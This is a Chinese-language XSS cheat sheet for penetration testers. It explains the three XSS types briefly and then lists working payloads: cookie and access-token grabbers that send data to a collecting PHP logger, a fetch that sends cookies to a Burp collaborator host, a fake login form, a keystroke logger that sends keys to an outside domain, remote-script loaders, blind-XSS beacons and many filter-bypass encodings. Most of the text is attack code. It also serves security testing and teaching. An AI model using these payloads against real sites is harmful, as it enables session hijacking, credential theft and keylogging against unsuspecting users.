# 跨站脚本攻击（XSS）

> 跨站脚本攻击（XSS）是一种通常出现在Web应用程序中的计算机安全漏洞。XSS允许攻击者将客户端脚本注入到其他用户查看的网页中。

## 概述

- [方法论](#方法论)
- [概念验证](#概念验证)
    - [数据抓取器](#数据抓取器)
    - [CORS](#CORS)
    - [UI欺骗](#UI欺骗)
    - [JavaScript键盘记录器](#JavaScript键盘记录器)
    - [其他方式](#其他方式)
- [识别XSS端点](#识别XSS端点)
    - [工具](#工具)
- [HTML/应用程序中的XSS](#HTML/应用程序中的XSS)
    - [常见载荷](#常见载荷)
    - [使用HTML5标签的XSS](#使用HTML5标签的XSS)
    - [使用远程JS的XSS](#使用远程JS的XSS)
    - [隐藏输入中的XSS](#隐藏输入中的XSS)
    - [大写输出中的XSS](#大写输出中的XSS)
    - [基于DOM的XSS](#基于DOM的XSS)
    - [JS上下文中的XSS](#JS上下文中的XSS)
- [URI包装中的XSS](#URI包装中的XSS)
    - [javascript包装](#javascript包装)
    - [data包装](#data包装)
    - [vbscript包装](#vbscript包装)
- [文件中的XSS](#文件中的XSS)
    - [XML中的XSS](#XML中的XSS)
    - [SVG中的XSS](#SVG中的XSS)
    - [Markdown中的XSS](#Markdown中的XSS)
    - [CSS中的XSS](#CSS中的XSS)
- [PostMessage中的XSS](#PostMessage中的XSS)
- [盲XSS](#盲XSS)
    - [XSS猎手](#XSS猎手)
    - [其他盲XSS工具](#其他盲XSS工具)
    - [盲XSS端点](#盲XSS端点)
    - [提示](#提示)
- [变异XSS](#变异XSS)
- [实验室](#实验室)
- [参考文献](#参考文献)

## 方法论

跨站脚本攻击（XSS）是一种通常出现在Web应用程序中的计算机安全漏洞。XSS允许攻击者将恶意代码注入到网站中，然后在访问该站点的任何用户的浏览器中执行。这可以允许攻击者窃取敏感信息，例如用户的登录凭据，或执行其他恶意操作。

主要有三种类型的XSS攻击：

- **反射型XSS**：在反射型XSS攻击中，恶意代码嵌入在一个链接中发送给受害者。当受害者点击链接时，代码在其浏览器中执行。例如，攻击者可以创建一个包含恶意JavaScript的链接，并通过电子邮件发送给受害者。当受害者点击链接时，JavaScript代码在其浏览器中执行，允许攻击者执行各种操作，如窃取其登录凭据。

- **存储型XSS**：在存储型XSS攻击中，恶意代码存储在服务器上，并且每次访问易受攻击页面时都会执行。例如，攻击者可以在博客文章的评论中注入恶意代码。当其他用户查看博客文章时，恶意代码会在他们的浏览器中执行，允许攻击者执行各种操作。

- **基于DOM的XSS**：是一种当易受攻击的Web应用程序修改用户浏览器中的DOM（文档对象模型）时发生的XSS攻击。例如，当用户输入用于更新页面的HTML或JavaScript代码时可能发生这种情况。在基于DOM的XSS攻击中，恶意代码不会发送到服务器，而是直接在用户的浏览器中执行。这使得这些类型的攻击难以检测和防止，因为服务器没有恶意代码的记录。

为了防止XSS攻击，重要的是正确地验证和清理用户输入。这意味着确保所有输入符合必要的标准，并删除任何潜在危险的字符或代码。在呈现到浏览器之前，对用户输入的特殊字符进行转义也很重要，以防止浏览器将其解释为代码。

## 概念验证

在利用XSS漏洞时，展示一个完整的利用场景以导致账户接管或敏感数据泄露比简单地报告带有alert载荷的XSS更为有效。目标是捕获有价值的数据，例如支付信息、个人可识别信息（PII）、会话cookie或凭据。

### 数据抓取器

获取管理员cookie或敏感访问令牌，以下载荷会将其发送到受控页面。

```html
<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>
<script>document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')</script>
<script>new Image().src="http://localhost/cookie.php?c="+document.cookie;</script>
<script>new Image().src="http://localhost/cookie.php?c="+localStorage.getItem('access_token');</script>
```

将收集的数据写入文件。

```php
<?php
$cookie = $_GET['c'];
$fp = fopen('cookies.txt', 'a+');
fwrite($fp, 'Cookie:' .$cookie."\r\n");
fclose($fp);
?>
```

### CORS

```html
<script>
  fetch('https://<SESSION>.burpcollaborator.net', {
  method: 'POST',
  mode: 'no-cors',
  body: document.cookie
  });
</script>
```

### UI欺骗

利用XSS来修改页面的HTML内容，显示伪造的登录表单。

```html
<script>
history.replaceState(null, null, '../../../login');
document.body.innerHTML = "</br></br></br></br></br><h1>Please login to continue</h1><form>Username: <input type='text'>Password: <input type='password'></form><input value='submit' type='submit'>"
</script>
```

### JavaScript键盘记录器

另一种收集敏感数据的方法是设置JavaScript键盘记录器。

```javascript
<img src=x onerror='document.onkeypress=function(e){fetch("http://domain.com?k="+String.fromCharCode(e.which))},this.remove();'>
```

### 其他方式

更多利用方法见 [http://www.xss-payloads.com/payloads-list.html?a#category=all](http://www.xss-payloads.com/payloads-list.html?a#category=all):

- [使用XSS和HTML5画布截屏](https://www.idontplaydarts.com/2012/04/taking-screenshots-using-xss-and-the-html5-canvas/)
- [JavaScript端口扫描器](http://www.gnucitizen.org/blog/javascript-port-scanner/)
- [网络扫描器](http://www.xss-payloads.com/payloads/scripts/websocketsnetworkscan.js.html)
- [.NET Shell执行](http://www.xss-payloads.com/payloads/scripts/dotnetexec.js.html)
- [重定向表单](http://www.xss-payloads.com/payloads/scripts/redirectform.js.html)
- [播放音乐](http://www.xss-payloads.com/payloads/scripts/playmusic.js.html)

## 识别XSS端点

此载荷在开发者控制台中打开调试器而不是触发弹出警报框。

```javascript
<script>debugger;</script>
```

现代应用可以通过[沙箱域][sandbox-domains]安全地托管各种用户生成的内容。

> 专门用来隔离用户上传的HTML、JavaScript或Flash小部件，确保它们无法访问任何用户数据。

[sandbox-domains]:https://security.googleblog.com/2012/08/content-hosting-for-modern-web.html

出于这个原因，最好使用`alert(document.domain)`或`alert(window.origin)`而非`alert(1)`作为默认的XSS载荷，以便了解XSS实际执行的范围。

更好的替换`<script>alert(1)</script>`的载荷：

```html
<script>alert(document.domain.concat("\n").concat(window.origin))</script>
```

虽然`alert()`对于反射型XSS来说很方便，但存储型XSS时它可能会成为一个负担，因为它需要关闭每个执行的弹窗，因此可以使用`console.log()`代替，在开发者控制台中显示消息（不需要任何交互）。

示例：

```html
<script>console.log("Test XSS from the search bar of page XYZ\n".concat(document.domain).concat("\n").concat(window.origin))</script>
```

参考：

- [Google Bughunter University - XSS in sandbox domains](https://sites.google.com/site/bughunteruniversity/nonvuln/xss-in-sandbox-domain)
- [LiveOverflow视频 - 不要使用alert(1)进行XSS](https://www.youtube.com/watch?v=KHwVjzWei1c)
- [LiveOverflow博文 - 不要使用alert(1)进行XSS](https://liveoverflow.com/do-not-use-alert-1-in-xss/)

### 工具

大多数工具也适用于盲XSS攻击：

- [XSSStrike](https://github.com/s0md3v/XSStrike): 非常受欢迎但不幸的是维护得不太好
- [xsser](https://github.com/epsylon/xsser): 利用无头浏览器检测XSS漏洞
- [Dalfox](https://github.com/hahwul/dalfox): 功能广泛且由于Go语言实现而极其快速
- [XSpear](https://github.com/hahwul/XSpear): 类似于Dalfox但基于Ruby
- [domdig](https://github.com/fcavallarin/domdig): 无头Chrome XSS测试器

## HTML/应用程序中的XSS

### 常见载荷

```javascript
// 基础载荷
<script>alert('XSS')</script>
<scr<script>ipt>alert('XSS')</scr<script>ipt>
"><script>alert('XSS')</script>
"><script>alert(String.fromCharCode(88,83,83))</script>
<script>\u0061lert('22')</script>
<script>eval('\x61lert(\'33\')')</script>
<script>eval(8680439..toString(30))(983801..toString(36))</script> //parseInt("confirm",30) == 8680439 && 8680439..toString(30) == "confirm"
<object/data="jav&#x61;sc&#x72;ipt&#x3a;al&#x65;rt&#x28;23&#x29;">

// 图像载荷
<img src=x onerror=alert('XSS');>
<img src=x onerror=alert('XSS')//
<img src=x onerror=alert(String.fromCharCode(88,83,83));>
<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
<img src=x:alert(alt) onerror=eval(src) alt=xss>
"><img src=x onerror=alert('XSS');>
"><img src=x onerror=alert(String.fromCharCode(88,83,83));>
<><img src=1 onerror=alert(1)>

// SVG载荷
<svgonload=alert(1)>
<svg/onload=alert('XSS')>
<svg onload=alert(1)//
<svg/onload=alert(String.fromCharCode(88,83,83))>
<svg id=alert(1) onload=eval(id)>
"><svg/onload=alert(String.fromCharCode(88,83,83))>
"><svg/onload=alert(/XSS/)
<svg><script href=data:,alert(1) />(`Firefox` 是唯一允许自闭合脚本的浏览器)
<svg><script>alert('33')
<svg><script>alert&lpar;'33'&rpar;

// Div载荷
<div onpointerover="alert(45)">MOVE HERE</div>
<div onpointerdown="alert(45)">MOVE HERE</div>
<div onpointerenter="alert(45)">MOVE HERE</div>
<div onpointerleave="alert(45)">MOVE HERE</div>
<div onpointermove="alert(45)">MOVE HERE</div>
<div onpointerout="alert(45)">MOVE HERE</div>
<div onpointerup="alert(45)">MOVE HERE</div>
```

### 使用HTML5标签的XSS

```javascript
<body onload=alert(/XSS/.source)>
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>
<video/poster/onerror=alert(1)>
<video><source onerror="javascript:alert(1)">
<video src=_ onloadstart="alert(1)">
<details/open/ontoggle="alert`1`">
<audio src onloadstart=alert(1)>
<marquee onstart=alert(1)>
<meter value=2 min=0 max=10 onmouseover=alert(1)>2 out of 10</meter>

<body ontouchstart=alert(1)> // 当手指触摸屏幕时触发
<body ontouchend=alert(1)>   // 当手指从触摸屏移开时触发
<body ontouchmove=alert(1)>  // 当手指在屏幕上拖动时触发。
```

### 使用远程JS的XSS

```html
<svg/onload='fetch("//host/a").then(r=>r.text().then(t=>eval(t)))'>
<script src=14.rs>
// 也可以指定任意载荷，例如：14.rs/#payload
e.g: 14.rs/#alert(document.domain)
```

### 隐藏输入中的XSS

```javascript
<input type="hidden" accesskey="X" onclick="alert(1)">
使用CTRL+SHIFT+X触发onclick事件
```

在较新浏览器中：firefox-130/chrome-108

```javascript
<input type="hidden" oncontentvisibilityautostatechange="alert(1)"  style="content-visibility:auto" >
```

### 大写输出中的XSS

```javascript
<IMG SRC=1 ONERROR=&#X61;&#X6C;&#X65;&#X72;&#X74;(1)>
```

### 基于DOM的XSS

基于DOM XSS sink。

```javascript
#"><img src=/ onerror=alert(2)>
```

### JS上下文中的XSS

```javascript
-(confirm)(document.domain)//
; alert(1);//
// （无引号/双引号的载荷来自[@brutelogic](https://twitter.com/brutelogic)
```

## URI包装中的XSS

### javascript包装

```javascript
javascript:prompt(1)

%26%23106%26%2397%26%23118%26%2397%26%23115%26%2399%26%23114%26%23105%26%23112%26%23116%26%2358%26%2399%26%23111%26%23110%26%23102%26%23105%26%23114%26%23109%26%2340%26%2349%26%2341

&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58&#99&#111&#110&#102&#105&#114&#109&#40&#49&#41

我们可以用十六进制/八进制编码“javascript:”
\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3aalert(1)
\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003aalert(1)
\152\141\166\141\163\143\162\151\160\164\072alert(1)

我们可以使用换行符
java%0ascript:alert(1)   - LF (\n)
java%09script:alert(1)   - Horizontal tab (\t)
java%0dscript:alert(1)   - CR (\r)

使用转义字符
\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)

使用换行符和注释 //
javascript://%0Aalert(1)
javascript://anything%0D%0A%0D%0Awindow.alert(1)
```

### data包装

```javascript
data:text/html,<script>alert(0)</script>
data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```

### vbscript包装

仅限IE

```javascript
vbscript:msgbox("XSS")
```

## 文件中的XSS

**注意**：这里使用XML CDATA节是为了让JavaScript载荷不被当作XML标记处理。

```xml
<name>
  <value><![CDATA[<script>confirm(document.domain)</script>]]></value>
</name>
```

### XML中的XSS

```xml
<html>
<head></head>
<body>
<something:script xmlns:something="http://www.w3.org/1999/xhtml">alert(1)</something:script>
</body>
</html>
```

### SVG中的XSS

简单的脚本。代号：绿色三角形

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
  <script type="text/javascript">
    alert(document.domain);
  </script>
</svg>
```

更全面的带有SVG标签属性、desc脚本、foreignObject脚本、foreignObject iframe、title脚本、animatetransform事件和简单脚本的载荷。代号：红色闪电。作者：noraj。

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" width="100" height="100" xmlns="http://www.w3.org/2000/svg" onload="alert('svg attribut')">
  <polygon id="lightning" points="0,100 50,25 50,75 100,0" fill="#ff1919" stroke="#ff0000"/>
  <desc><script>alert('svg desc')</script></desc>
  <foreignObject><script>alert('svg foreignObject')</script></foreignObject>
  <foreignObject width="500" height="500">
    <iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:alert('svg foreignObject iframe');" width="400" height="250"/>
  </foreignObject>
  <title><script>alert('svg title')</script></title>
  <animatetransform onbegin="alert('svg animatetransform onbegin')"></animatetransform>
  <script type="text/javascript">
    alert('svg script');
  </script>
</svg>
```

#### 简短的SVG载荷

```javascript
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>

<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
<svg><foreignObject><![CDATA[</foreignObject><script>alert(2)</script>]]></svg>
<svg><title><![CDATA[</title><script>alert(3)</script>]]></svg>
```

### 在SVG中嵌套XSS

在SVG中包含远程SVG图像可行，但不会触发嵌套在远程SVG中的XSS。作者：noraj。

SVG 1.x (xlink:href)

```xml
<svg width="200" height="200" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="http://127.0.0.1:9999/red_lightning_xss_full.svg" height="200" width="200"/>
</svg>
```

在SVG中包含远程SVG片段可行，但不会触发嵌套在远程SVG元素中的XSS，因为在现代浏览器中不可能在多边形/矩形等元素上添加易受攻击的属性。作者：noraj。

SVG 1.x (xlink:href)

```xml
<svg width="200" height="200" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <use xlink:href="http://127.0.0.1:9999/red_lightning_xss_full.svg#lightning"/>
</svg>
```

然而，在SVG文档中包含SVG标签可行，并允许从子SVG执行XSS。代号：法国国旗。作者：noraj。

```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <svg x="10">
    <rect x="10" y="10" height="100" width="100" style="fill: #002654"/>
    <script type="text/javascript">alert('sub-svg 1');</script>
  </svg>
  <svg x="200">
    <rect x="10" y="10" height="100" width="100" style="fill: #ED2939"/>
    <script type="text/javascript">alert('sub-svg 2');</script>
  </svg>
</svg>
```

### Markdown中的XSS

```csharp
[a](javascript:prompt(document.cookie))
[a](j a v a s c r i p t:prompt(document.cookie))
[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
[a](javascript:window.onerror=alert;throw%201)
```

### CSS中的XSS

```html
<!DOCTYPE html>
<html>
<head>
<style>
div  {
    background-image: url("data:image/jpg;base64,<\/style><svg/onload=alert(document.domain)>");
    background-color: #cccccc;
}
</style>
</head>
  <body>
    <div>lol</div>
  </body>
</html>
```

## PostMessage中的XSS

> 如果目标源是通配符*，消息可以发送到任何有子页面引用的域。

```html
<html>
<body>
    <input type=button value="Click Me" id="btn">
</body>

<script>
document.getElementById('btn').onclick = function(e){
    window.poc = window.open('http://www.redacted.com/#login');
    setTimeout(function(){
        window.poc.postMessage(
            {
                "sender": "accounts",
                "url": "javascript:confirm('XSS')",
            },
            '*'
        );
    }, 2000);
}
</script>
</html>
```

## 盲XSS

### XSS猎手

> XSS猎手可以帮助您找到各种类型的跨站脚本漏洞，包括经常被忽略的盲XSS。该服务通过托管专门的XSS探测器实现，一旦触发，会扫描页面并将有关易受攻击页面的信息发送到XSS猎手服务。

XSS猎手已被弃用，曾可用作 [https://xsshunter.com/app](https://xsshunter.com/app)。

您可以设置一个替代版本

- 自托管版本来自 [mandatoryprogrammer/xsshunter-express](https://github.com/mandatoryprogrammer/xsshunter-express)
- 托管于 [xsshunter.trufflesecurity.com](https://xsshunter.trufflesecurity.com/)

```xml
"><script src="https://js.rip/<custom.name>"></script>
"><script src=//<custom.subdomain>.xss.ht></script>
<script>$.getScript("//<custom.subdomain>.xss.ht")</script>
```

### 其他盲XSS工具

- [Netflix-Skunkworks/sleepy-puppy](https://github.com/Netflix-Skunkworks/sleepy-puppy) - Sleepy Puppy XSS Payload Management Framework
- [LewisArdern/bXSS](https://github.com/LewisArdern/bXSS) - bXSS是一个可以被漏洞猎人和组织用来识别盲跨站脚本的实用程序。
- [ssl/ezXSS](https://github.com/ssl/ezXSS) - ezXSS是渗透测试人员和漏洞赏金猎人测试（盲）跨站脚本的一种简便方法。

### 盲XSS端点

- 联系表单
- 支持票务
- Referer头
    - 自定义站点分析
    - 管理面板日志
- 用户代理
    - 自定义站点分析
    - 管理面板日志
- 评论框
    - 管理面板

### 提示

您可以使用[XSS数据抓取器](#data-grabber)和一个一行HTTP服务器来确认盲XSS的存在，然后再部署重量级的盲XSS测试工具。

示例载荷：

```html
<script>document.location='http://10.10.14.30:8080/XSS/grabber.php?c='+document.domain</script>
```

示例一行HTTP服务器：

```ps1
ruby -run -ehttpd . -p8080
```

## 变异XSS

利用浏览器的怪癖来重新创建一些HTML标签。

**示例**：由Masato Kinugawa提出的变异XSS，用于针对Google搜索中的[cure53/DOMPurify](https://github.com/cure53/DOMPurify)组件。

```javascript
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

## 实验室

- [PortSwigger Labs for XSS](https://portswigger.net/web-security/all-labs#cross-site-scripting)
- [Root Me - XSS - 反射](https://www.root-me.org/en/Challenges/Web-Client/XSS-Reflected)
- [Root Me - XSS - 服务端](https://www.root-me.org/en/Challenges/Web-Server/XSS-Server-Side)
- [Root Me - XSS - 存储 1](https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-1)
- [Root Me - XSS - 存储 2](https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-2)
- [Root Me - XSS - 存储 - 过滤绕过](https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-filter-bypass)
- [Root Me - XSS DOM Based - 引言](https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-Introduction)
- [Root Me - XSS DOM Based - AngularJS](https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-AngularJS)
- [Root Me - XSS DOM Based - Eval](https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-Eval)
- [Root Me - XSS DOM Based - 过滤绕过](https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-Filters-Bypass)
- [Root Me - XSS - DOM Based](https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based)
- [Root Me - 自XSS - DOM秘密](https://www.root-me.org/en/Challenges/Web-Client/Self-XSS-DOM-Secrets)
- [Root Me - 自XSS - 赛道条件](https://www.root-me.org/en/Challenges/Web-Client/Self-XSS-Race-Condition)

## 参考文献

- [滥用XSS过滤器：一个^导致了XSS（CVE-2016-3212）- Masato Kinugawa(@kinugawamasato)- 2016年7月15日](http://mksben.l0.cm/2016/07/xxn-caret.html)
- [账户恢复XSS - Gábor Molnár - 2016年4月13日](https://sites.google.com/site/bughunteruniversity/best-reports/account-recovery-xss)
- [通过PNGs与奇怪内容类型在Facebook上的XSS - Jack Whitton(@fin1te) - 2016年1月27日](https://whitton.io/articles/xss-on-facebook-via-png-content-types/)
- [绕过基于签名的XSS过滤器：修改脚本代码 - PortSwigger - 2020年8月4日](https://portswigger.net/support/bypassing-signature-based-xss-filters-modifying-script-code)
- [组合技术导致Google DOM Based XSS - Sasi Levi - 2016年9月19日](http://sasi2103.blogspot.sg/2016/09/combination-of-techniques-lead-to-dom.html)
- [跨站脚本（XSS）速查表 - PortSwigger - 2019年9月27日](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [编码差异：为什么字符集很重要 - Stefan Schiller - 2024年7月15日](https://www.sonarsource.com/blog/encoding-differentials-why-charset-matters/)
- [Facebook的举措 - OAuth XSS - Paulos Yibelo - 2015年12月10日](http://www.paulosyibelo.com/2015/12/facebooks-moves-oauth-xss.html)
- [Frans Rosén讲述如何获得Mega.co.nz XSS奖励 - Frans Rosén - 2013年2月14日](https://labs.detectify.com/2013/02/14/how-i-got-the-bug-bounty-for-mega-co-nz-xss/)
- [Google XSS Turkey - Frans Rosén - 2015年6月6日](https://labs.detectify.com/2015/06/06/google-xss-turkey/)
- [如何通过玩弄Protobuf找到价值5000美元的Google Maps XSS - Marin Moulinier - 2017年3月9日](https://medium.com/@marin_m/how-i-found-a-5-000-google-maps-xss-by-fiddling-with-protobuf-963ee0d9caff#.cktt61q9g)
- [两次终结奖励计划 - Itzhak(Zuk) Avraham和Nir Goldshlager - 2012年5月](http://conference.hitb.org/hitbsecconf2012ams/materials/D1T2%20-%20Itzhak%20Zuk%20Avraham%20and%20Nir%20Goldshlager%20-%20Killing%20a%20Bug%20Bounty%20Program%20-%20Twice.pdf)
- [Google搜索中的变异XSS - Tomasz Andrzej Nidecki - 2019年4月10日](https://www.acunetix.com/blog/web-security-zone/mutation-xss-in-google-search/)
- [mXSS攻击：利用innerHTML突变攻击安全的Web应用程序 - Mario Heiderich, Jörg Schwenk, Tilman Frosch, Jonas Magazinius, Edward Z. Yang - 2013年9月26日](https://cure53.de/fp170.pdf)
- [在一百万个站点上进行postMessage XSS - Mathias Karlsson - 2016年12月15日](https://labs.detectify.com/2016/12/15/postmessage-xss-on-a-million-sites/)
- [RPO导致Google信息泄露 - @filedescriptor - 2016年7月3日](https://web.archive.org/web/20220521125028/https://blog.innerht.ml/rpo-gadgets/)
- [秘密Web黑客知识：CTF作者讨厌这些简单技巧 - Philippe Dourassov - 2024年5月13日](https://youtu.be/Sm4G6cAHjWM)
- [使用Market Forms XSS、postMessage帧跳跃和jQuery-JSONP在www.hackerone.com窃取联系表单数据 - Frans Rosén(fransrosen) - 2017年2月17日](https://hackerone.com/reports/207042)
- [影响所有幻想体育的Stored XSS [*.fantasysports.yahoo.com] - thedawgyg - 2016年12月7日](https://web.archive.org/web/20161228182923/http://dawgyg.com/2016/12/07/stored-xss-affecting-all-fantasy-sports-fantasysports-yahoo-com-2/)
- [Stored XSS in *.ebay.com - Jack Whitton(@fin1te) - 2013年1月27日](https://whitton.io/archive/persistent-xss-on-myworld-ebay-com/)
- [Stored XSS in Facebook聊天、签到、Facebook Messenger - Nirgoldshlager - 2013年4月17日](http://web.archive.org/web/20130420095223/http://www.breaksec.com/?p=6129)
- [通过管理员账户妥协Uber开发者的Stored XSS - James Kettle(@albinowax) - 2016年7月18日](https://hackerone.com/reports/152067)
- [Snapchat上的Stored XSS - Mrityunjoy - 2018年2月9日](https://medium.com/@mrityunjoy/stored-xss-on-snapchat-5d704131d8fd)
- [通过Dataset Publishing Language在Google中发现的Stored XSS和SSRF - Craig Arendt - 2018年3月7日](https://s1gnalcha0s.github.io/dspl/2018/03/07/Stored-XSS-and-SSRF-Google.html)
- [sms-be-vip.twitter.com中的巧妙HTML注入和可能的XSS - Ahmed Aboul-Ela(@aboul3la) - 2016年7月9日](https://hackerone.com/reports/150179)
- [通过停止重定向和javascript方案的Twitter XSS - Sergey Bobrov(bobrov) - 2017年9月30日](https://hackerone.com/reports/260744)
- [Uber漏洞赏金：将Self-XSS转化为Good XSS - Jack Whitton(@fin1te) - 2016年3月22日](https://whitton.io/articles/uber-turning-self-xss-into-good-xss/)
- [Uber Self XSS到Global XSS - httpsonly - 2016年8月29日](https://httpsonly.blogspot.hk/2016/